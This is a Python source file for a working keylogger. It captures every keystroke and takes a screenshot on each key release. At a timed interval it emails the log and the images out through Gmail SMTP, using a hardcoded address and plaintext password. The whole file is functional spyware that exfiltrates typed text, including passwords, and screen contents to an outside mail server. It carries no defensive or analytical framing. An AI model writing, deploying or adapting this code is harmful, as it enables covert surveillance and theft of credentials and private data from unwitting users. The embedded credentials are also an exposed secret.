import keyboard  # for keylogs
import smtplib  # for sending email using SMTP protocol (gmail)
from threading import Semaphore, Timer
import os
import pyautogui
from email.message import EmailMessage
import imghdr

SEND_REPORT_EVERY = 30  # 10 minutes
EMAIL_ADDRESS = "dumayitay@gmail.com"
EMAIL_PASSWORD = "Itay2616"
try:
    os.mkdir(r"d:\newtest")
except FileExistsError:
    pass


class Keylogger:
    def __init__(self, interval):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        # this is the string variable that contains the log of all
        # the keystrokes within `self.interval`
        self.log = ""
        # for blocking after setting the on_release listener
        self.semaphore = Semaphore(0)
        self.screen_shot_list = []
        self.index = 0
        self.last_image_sent_index = 0

    def callback(self, event):
        """This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)"""
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
        myScreenshot = pyautogui.screenshot()
        path = r"d:\newtest\image" + str(self.index) + r".png"
        myScreenshot.save(path)
        self.index += 1
        self.screen_shot_list.append(path)

    def sendmail(self, email, password, message):
        msg = EmailMessage()
        msg["subject"] = "Key-Logger bot"
        msg["From"] = email
        msg["To"] = email
        msg.set_content(message)
        for image in self.screen_shot_list:
            with open(image, "rb") as f:
                file_data = f.read()
                file_type = imghdr.what(f.name)
                file_name = f.name
            msg.add_attachment(file_data, maintype="image", subtype=file_type, filename=file_name)
        # manages a connection to the SMTP server
        with smtplib.SMTP(host="smtp.gmail.com", port=587) as server:
            server.starttls()
            server.login(email, password)
            server.send_message(msg)
        self.screen_shot_list = []
    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            # print(self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # block the current thread,
        # since on_release() doesn't block the current thread
        # if we don't block it, when we execute the program, nothing will happen
        # that is because on_release() will start the listener in a separate thread
        self.semaphore.acquire()


if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()
